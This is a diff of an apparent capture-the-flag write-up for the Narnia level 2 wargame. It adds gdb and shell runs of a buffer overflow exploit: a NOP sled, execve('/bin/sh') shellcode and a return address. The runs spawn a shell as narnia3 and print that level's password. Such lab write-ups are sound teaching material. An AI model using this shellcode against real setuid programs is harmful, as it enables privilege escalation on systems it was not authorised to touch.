@@ -155,6 +155,19 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffdad0:	0x3b31303d	0x2a3a3133	0x6d70722e	0x3b31303d
 0xffffdae0:	0x2a3a3133	0x72616a2e	0x3b31303d	0x2a3a3133
 0xffffdaf0:	0x7261772e	0x3b31303d	0x2a3a3133	0x7261652e  
-
+(gdb) r $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
+(gdb) r $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
+Starting program: /games/narnia/narnia2 $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
+process 22298 is executing new program: /bin/dash
+$ ^C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7b006b0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
+81	../sysdeps/unix/syscall-template.S: No such file or directory.  
+(gdb) Quit  
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')  
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
 
 ```
